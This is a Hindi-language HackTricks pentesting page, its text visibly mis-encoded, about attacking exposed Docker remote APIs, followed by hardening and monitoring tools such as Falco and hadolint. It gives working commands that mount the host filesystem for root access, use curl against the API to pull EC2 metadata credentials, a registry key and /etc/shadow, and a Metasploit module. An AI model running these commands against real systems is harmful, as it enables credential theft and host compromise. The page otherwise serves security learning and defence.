рдпрджрд┐ рдЖрдк **`docker` рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рд░рд┐рдореЛрдЯ рдбреЙрдХрд░ API рд╕реЗ рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рд░реБрдЪрд┐ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдкрд┐рдЫрд▓реЗ** [**рдХрдорд╛рдВрдб**](2375-pentesting-docker.md#basic-commands) рдХреЛ **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
рдЖрдк `export DOCKER_HOST="tcp://localhost:2375"` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **docker** рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде `-H` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдмрдЪрд╛ рд╕рдХрддреЗ** рд╣реИрдВред
{% endhint %}

#### рддреНрд╡рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### рдХрд░реНрд▓

рдХрднреА-рдХрднреА рдЖрдк **TLS** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд▓рд┐рдП **2376** рджреЗрдЦреЗрдВрдЧреЗред рдореИрдВ рдбреЙрдХрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рд╣реЛ рдкрд╛ рд░рд╣рд╛ рд╣реВрдБ рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдХрд░реНрд▓ рдХреЗ рд╕рд╛рде рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
```bash
#List containers
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s тАУinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itтАЩs also worth checking out services in case they are adding secrets via environment variables)
curl -s тАУinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
рдпрджрд┐ рдЖрдк рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рд╡рд╣рд╛рдБ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЙрдкрд▓рдмреНрдз рд╣реИ рдЬрд╣рд╛рдБ рд╕реЗ рдореИрдВрдиреЗ рдХрдорд╛рдВрдб рдХреЙрдкреА рдХреА рд╣реИ: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Compromising

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рдЖрдкрдХреЛ **рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ** рдХреЗ рддрд░реАрдХреЗ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЖрдк рджреВрд░рд╕реНрде рдорд╢реАрди рдореЗрдВ рдПрдХ рдХрдордЬреЛрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдорд╢реАрди рдХреЛ рдХрдордЬреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

рдпрджрд┐ рдЖрдк рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рдЬреЛ рдбреЙрдХрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк [**рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## рдЪрд▓ рд░рд╣реЗ Docker containers рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХрд╛ рдЦреЛрдЬ
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
рдЧреБрдкреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП **env** (рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдЦрдВрдб) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ:

* рдкрд╛рд╕рд╡рд░реНрдбред
* рдЖрдИрдкреА'sред
* рдкреЛрд░реНрдЯреНрд╕ред
* рдкрдереНрд╕ред
* рдЕрдиреНрдп...ред

рдЕрдЧрд░ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## рдЕрдкрдиреЗ Docker рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдПрдВ

### Docker рд╕реНрдерд╛рдкрдирд╛ рдФрд░ рдЙрдкрдпреЛрдЧ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдПрдВ

* рдЖрдк [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреА рд╡рд░реНрддрдорд╛рди docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* `./docker-bench-security.sh`
* рдЖрдк [https://github.com/kost/dockscan](https://github.com/kost/dockscan) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреА рд╡рд░реНрддрдорд╛рди docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockscan -v unix:///var/run/docker.sock`
* рдЖрдк [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдПрдХ рдХрдВрдЯреЗрдирд░ рд╡рд┐рднрд┐рдиреНрди рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХреЗ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдХреЛ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕рд╕реЗ рдХрд┐рд╕реА рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ рдЬрд╛рдирдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реИ:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Docker рдЗрдореЗрдЬ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдПрдВ

* рдЖрдк [https://github.com/quay/clair](https://github.com/quay/clair) рдХрд╛ рдбреЙрдХрд░ рдЗрдореЗрдЬ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЖрдкрдХреА рдЕрдиреНрдп рдбреЙрдХрд░ рдЗрдореЗрдЬреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗред
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Docker рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдПрдВ

* рдЖрдк [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреА Docker рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред рд╣рд░ рдЧрд▓рддреА рдХреЛ рдПрдХ рдЖрдИрдбреА рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк рдпрд╣рд╛рдБ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдХреИрд╕реЗ рдареАрдХ рдХрд░реЗрдВ рдЗрд╕реЗ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВред
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* рдЖрдк [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреА Docker рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* рдЖрдк [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреА Docker рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* рдЖрдк [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреА Docker рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛

* рдЖрдк [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЪрд▓ рд░рд╣реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреЗ рд▓рд┐рдПред
* рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЪрдВрдХ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХреИрд╕реЗ **Falco рдПрдХ рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдбрд╛рд▓рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдмрд╛рдж, рдпрд╣ рдирд┐рдпрдореЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ **рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ 2 рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рд╣реЛ рдЧрдП рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдЙрдВрдЯ рд╣реИ, рдФрд░ рдХреБрдЫ рд╕реЗрдХрдВрдб рдХреЗ рдмрд╛рдж рдпрд╣ рдбрд┐рдЯреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рд╢реИрд▓ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рдерд╛ред
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдбреЙрдХрд░

рдЖрдк рдСрдбрд┐рдЯреАрдбреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЙрдХрд░ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн
* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдПрдкреАрдЖрд░реНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
